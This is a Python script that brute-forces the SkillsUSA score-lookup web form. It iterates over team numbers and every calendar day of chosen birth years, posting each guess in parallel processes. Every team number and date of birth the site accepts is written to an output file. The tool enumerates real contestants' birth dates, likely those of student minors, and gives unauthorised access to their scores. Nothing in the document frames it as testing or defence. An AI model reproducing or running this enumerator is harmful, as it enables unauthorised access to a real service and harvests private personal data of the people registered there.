#!/usr/bin/env python3

import argparse
from consolemenu import *
from consolemenu.items import *
import time
import requests
from multiprocessing import Pool
import bs4
BeautifulSoup = bs4.BeautifulSoup

url = "https://www.skillsusa-register.org/rpts/Eventscoredetails.aspx"
noMatch = "No Matching Contestant Scores Found"
sqlException = "System.Data.SqlClient.SqlException"
payload = {
"__EVENTTARGET": None,
"__EVENTARGUMENT": None,
"__LASTFOCUS": None,
"__VIEWSTATE": "",
"__VIEWSTATEGENERATOR": "EA0F13DF",
"__EVENTVALIDATION": "",
"cboEvent": None,
"cboContest": None,
"txtConSeq": None,
"txtDOB": None,
}
filter = ""

def main():
    global EID,CID,TEAM,YEAR,PROC,OUT
    cliargs()
    if EID != None and CID != None and TEAM != None and YEAR != None and PROC != None and OUT != None:
        print("starting using cli values")
    else:
        mainMenu()
    if len(TEAM) == 4:
        try:
            TEAM = int(TEAM)
        except:
            exit
    elif len(TEAM) == 9:
        try:
            TEAM = TEAM.split("-")
        except:
            exit
    else:
        print("incorret length")
    open(OUT, 'w').write("\x00")
    setup()

def cliargs():
    parser = argparse.ArgumentParser(description="Do not use cli args unless you know what you are doing, special variables have abstract values given by SkillsUSA")
    parser.add_argument('-E', '-eventid', help="Event ID found in the html of the dropdown")
    parser.add_argument('-C', '-contestid', help="Contest ID found in the html of the dropdown")
    parser.add_argument('-T', '-teamnumber', help="Team number(s) as either 1234 or 1000-1050")
    parser.add_argument('-D', '-dobyear', help="year to iterate over when brute forcing")
    parser.add_argument('-P', '-processes', type=int, help="amount of team processes running at once, each team has 12 processes")
    parser.add_argument('-O', '-output', help="Output file to store successful OUTins")
    args = parser.parse_args()
    global EID,CID,TEAM,YEAR,PROC,OUT
    EID,CID,TEAM,YEAR,PROC,OUT = args.E,args.C,args.T,args.D,args.P,args.O

def mainMenu():
    menu = ConsoleMenu("SkillsUSA score enumeration", "Skill issue", exit_option_text="Continue", exit_menu_char="C")
    menu.append_item(FunctionItem("Event & Contest", idMenu, []))
    menu.append_item(FunctionItem("Team Number", menuFunctions, ["team"]))
    menu.append_item(FunctionItem("Date of Birth", menuFunctions, ["year"]))
    menu.append_item(FunctionItem("Save File", menuFunctions, ["out"]))
    menu.append_item(FunctionItem("Processes", menuFunctions, ["proc"]))
    menu.append_item(FunctionItem("Value check", menuFunctions, [f"print"]))
    menu.show()

def idMenu():
    menu = ConsoleMenu("Event and Contest", "Set event before contest, filter resets after each selection", exit_option_text="Return to main menu", exit_menu_char="x")
    menu.append_item(FunctionItem("Filter", menuFunctions, ["filter"]))
    menu.append_item(FunctionItem("Event", menuFunctions, ["eid"]))
    menu.append_item(FunctionItem("Contest", menuFunctions, ["cid"]))
    menu.show()

def menuFunctions(condition):
    global filter,EID,CID,TEAM,YEAR,PROC,OUT
    match condition:
        case "filter":
            filter = input("Enter some text to filter for in the next search\n*Filter resets after search*\n: ")
        case "eid":
            html = requests.get(url).text
            EID = parse(html, "cboEvent", filter)
            filter = ""
            html = None
        case "cid":
            payload['__EVENTTARGET'] = "cboEvent"
            html = requests.post(url, data=payload).text
            CID = parse(html, "cboContest", filter)
            payload['__EVENTTARGET'] = ''
            html = None
            filter = ""
        case "team":
            while True:
                TEAM = input("Enter Team number or range\nFormat [1234 or 1000-2000]\n: ")
                if len(TEAM) == 4:
                    try:
                        TEAM = int(TEAM)
                    except:
                        print("!Not a Number!")
                elif len(TEAM) == 9:
                    try:
                        TEAM = TEAM.split('-')
                    except:
                        print("!Not hyphin seperated '-'!")

        case "year":
            while True:
                YEAR = input("Enter the year or years to uses seperated by commas\nFormat [yyyy,yyyy,yyyy]\n: ")
                YEAR = YEAR.split(',')
                try:
                    for y in YEAR:
                        YEAR[YEAR.index(y)] = int(y.strip())
                    break
                except:
                    print("!Not a number or comma seperated list")
                    pass
        case "proc":
            while True:
                PROC = input("Enter the amount of year processes to run at the same time\nNote each year process spawns 1 for each month for a total of 12 for each year\nThis is very dependant on you computer\n: ")
                try:
                    PROC = int(PROC)
                    break
                except:
                    print("!Not a number!")
                    pass
        case "out":
            OUT = input("Enter the file name to save any found information to\nFile extentions are not added, I recommand adding '.txt' to the filename\n: ")
        case "print":
            input(f"EID={EID}\/CID={CID}\/TEAM={TEAM}\/YEAR={YEAR}\/PROC={PROC}\/OUT={OUT}")




def parse(html, id, filter):
    soup = BeautifulSoup(html, "html.parser").find("select", id=id).contents
    for i in soup:
        if type(i) == bs4.NavigableString:
            soup.remove(i)
    bs_menu = []
    console_menu = []
    for option in soup:
        if filter != None:
            if filter in str(option):
                bs_menu.append(option)
                console_menu.append(str(option.text))
        else:
            bs_menu.append(option)
            console_menu.append(str(option.text))

    index = menu(console_menu, id)
    ID = bs_menu[index]["value"]
    return ID

def setup():
    global EID,CID,TEAM,YEAR,PROC
    payload['cboEvent'] = EID
    payload['cboContest'] = CID
    payload['btnSubmit'] = 'View+Scores'
    if isinstance(TEAM, int):
        print("Single Team : " + str(TEAM))
        array = [[1,31],[2,29],[3,31],[4,30],[5,31],[6,30],[7,31],[8,31],[9,30],[10,31],[11,30],[12,31]]
        for iter in array:
            iter.append(YEAR)
            iter.append(TEAM)
        with Pool(12) as p:
            p.starmap(bruteForce, array)
    elif isinstance(TEAM, list):
        print("Multi Team")
        with Pool(PROC) as p:
            teams = []
            lower = int(TEAM[0])
            upper = int(TEAM[1])
            for team in range(lower, upper + 1):
                teams.append(team)
            p.starmap(teamMap, [[team, YEAR]for team in teams])
    else:
        print("Failed condition")
        print(type(TEAM))

def teamMap(team, year):
    print(f"Trying Team {team}")
    array = [[1,31],[2,29],[3,31],[4,30],[5,31],[6,30],[7,31],[8,31],[9,30],[10,31],[11,30],[12,31]]
    with Pool(12) as p:
        for iter in array:
            iter.append(year)
            iter.append(team)
        p.starmap(bruteForce, array)

def bruteForce(month, days, year, team):
    data = payload
    data["txtConSeq"] = team
    for day in range(1, days + 1):
        dob = f"{month}/{day}/{year}"
        data["txtDOB"] = dob
        C = requests.post(url, data=data).text
        if (check(C)):
            valid(team, dob)

def check(html):
    if noMatch in html:
        return False
    elif sqlException in html:
        return False
    else:
        return True

def valid(team, dob):
    global OUT
    text = f'[*] Team {team} : DOB {dob}\n'
    print(text)
    if text not in open(OUT, 'r').read():
        open(OUT, 'a').write(text)

def menu(selections, title):
    print("menu exec")
    return SelectionMenu.get_selection(selections, title=title)

if __name__ == "__main__":
    main()
